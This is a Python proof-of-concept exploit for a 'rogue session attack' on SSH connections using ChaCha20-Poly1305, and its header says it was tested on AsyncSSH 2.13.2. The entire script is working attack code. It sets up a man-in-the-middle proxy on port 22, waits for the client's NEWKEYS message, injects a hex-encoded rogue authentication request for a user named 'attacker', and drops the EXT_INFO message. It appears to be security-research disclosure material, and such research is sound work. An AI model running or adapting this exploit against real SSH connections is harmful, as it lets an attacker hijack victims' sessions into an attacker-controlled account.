#!/usr/bin/python3
import os, socket, sys
from threading import Thread
from binascii import unhexlify
from time import sleep

##################################################################################
## Proof of Concept for the rogue session attack (ChaCha20-Poly1305)            ##
##                                                                              ##
## Variant: Unmodified variant (EXT_INFO by client required)                    ##
##                                                                              ##
## Client(s) tested: AsyncSSH 2.13.2 (simple_client.py example)                 ##
## Server(s) tested: AsyncSSH 2.13.2 (simple_server.py example)                 ##
##                                                                              ##
## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0 ##
##################################################################################

INTERFACE = 'eth0'
TARGET_PORT = 22
TARGET_IP = '192.168.22.10'

def is_root():
    return os.geteuid() == 0

asyncssh_newkeys_start = b'\x00\x00\x00\x0c\x0a\x15'
def contains_asyncssh_newkeys(data):
    return asyncssh_newkeys_start in data

rogue_userauth_request = unhexlify('000000440b320000000861747461636b65720000000e7373682d636f6e6e656374696f6e0000000870617373776f7264000000000861747461636b65720000000000000000000000')
def insert_rogue_authentication_request(data):
    newkeys_index = data.index(asyncssh_newkeys_start)
    # Insert rogue authentication request and remove SSH_MSG_EXT_INFO
    return data[:newkeys_index] + rogue_userauth_request + data[newkeys_index:newkeys_index + 16] + data[newkeys_index + 16 + 60:]

def forward_client_to_server(client_socket, server_socket):
    delay_next = False
    try:
        while True:
            client_data = client_socket.recv(4096)
            if delay_next:
                delay_next = False
                sleep(0.25)
            if contains_asyncssh_newkeys(client_data):
                print("[+] SSH_MSG_NEWKEYS sent by client identified!")
                if len(client_data) < 156:
                    print("[+] client_data does not contain all messages sent by the client yet. Receiving additional bytes until we have 156 bytes buffered!")
                while len(client_data) < 156:
                    client_data += client_socket.recv(4096)
                print(f"[d] Original client_data before modification: {client_data.hex()}")
                client_data = insert_rogue_authentication_request(client_data)
                print(f"[d] Modified client_data with rogue authentication request: {client_data.hex()}")
                delay_next = True
            if len(client_data) == 0:
                break
            server_socket.send(client_data)
    except ConnectionResetError:
        print("[!] Client connection has been reset. Continue closing sockets.")
    print("[!] forward_client_to_server thread ran out of data, closing sockets!")
    client_socket.close()
    server_socket.close()

def forward_server_to_client(client_socket, server_socket):
    try:
        while True:
            server_data = server_socket.recv(4096)
            if len(server_data) == 0:
                break
            client_socket.send(server_data)
    except ConnectionResetError:
        print("[!] Target connection has been reset. Continue closing sockets.")
    print("[!] forward_server_to_client thread ran out of data, closing sockets!")
    client_socket.close()
    server_socket.close()

if __name__ == '__main__':
    if not is_root():
        print("[!] Script must be run as root!")
        sys.exit(1)

    print("--- Proof of Concept for the rogue session attack (ChaCha20-Poly1305) ---")
    mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mitm_socket.bind(("0.0.0.0", TARGET_PORT))
    mitm_socket.listen(5)

    print("[+] MitM Proxy started. Listening on port 22 for incoming connections...")

    try:
        while True:
            client_socket, client_addr = mitm_socket.accept()
            print(f"[+] Accepted connection from: {client_addr}")
            print(f"[+] Establishing new server connection to {(TARGET_IP, TARGET_PORT)}.")
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((TARGET_IP, TARGET_PORT))
            print("[+] Spawning new forwarding threads to handle client connection.")
            Thread(target=forward_client_to_server, args=(client_socket, server_socket)).start()
            Thread(target=forward_server_to_client, args=(client_socket, server_socket)).start()
    except KeyboardInterrupt:
        client_socket.close()
        server_socket.close()
        mitm_socket.close()
